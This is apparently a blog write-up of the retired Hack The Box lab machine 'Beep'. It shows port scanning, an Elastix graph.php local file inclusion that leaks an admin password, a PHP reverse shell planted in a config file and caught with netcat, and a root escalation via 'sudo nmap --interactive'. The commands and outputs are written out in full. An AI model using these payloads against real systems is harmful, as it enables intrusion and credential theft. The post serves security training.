---
layout: post
title: Hack the Box - Beep
date: 2020-07-12 22:11:22 +0100
description: Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.
img: beep.png
fig-caption: Beep
categories: HackTheBox
tags: [Easy, Linux, Retired, CVE]
---
## Overview
Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.
## Enumeration
When running port scanning we see there are a large number of open ports. So starting from the webserver, we see an elastix login page.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ sudo nmap -p- -T4  10.129.117.90                                             
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-21 19:16 GMT
Nmap scan report for 10.129.117.90
Host is up (0.017s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
942/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```
## Foothold
When we search for exploits there are a few available.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/beep]
└─$ searchsploit elastix
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                              | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                            | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                      | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                   | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                  | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                 | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                             | php/webapps/18650.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
After trying to use the pre-authenticated RCE exploit and failing, I attempted the lfi exploit with more success.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/beep]
└─$ curl -k https://10.129.117.90/vtigercrm/graph.php\?current_language=../../../../../../../..//etc/amportal.conf%00\&module=Accounts\&action
# This file is part of FreePBX.
...
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```
We can use the above credentials to authenticate to the platform, once in I poked around and found a page where we can edit configuration files found here:
```
/index.php?menu=file_editor&action=edit&file=adsi.conf
```
I placed a reverse shell in the adsi.conf file similar to the one [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Then when I include the file in the same way as the password file we should receive a reverse shell
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/beep]
└─$ curl -k https://10.129.117.90/vtigercrm/graph.php?current_language=../../../../../../../../etc/asterisk/adsi.conf%00&module=Accounts&action

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/beep]
└─$ sudo nc -nlvp 4242                                                                                                                                                                                                                   1 ⨯
listening on [any] 4242 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.129.117.90] 38124
bash-3.2$ whoami
 whoami
asterisk
```
## Privilege Escalation
To escalate to root I used snippet from GTFObins found [here](https://gtfobins.github.io/gtfobins/nmap/#sudo)
```
bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash
!bash
bash-3.2# whoami
whoami
root
```
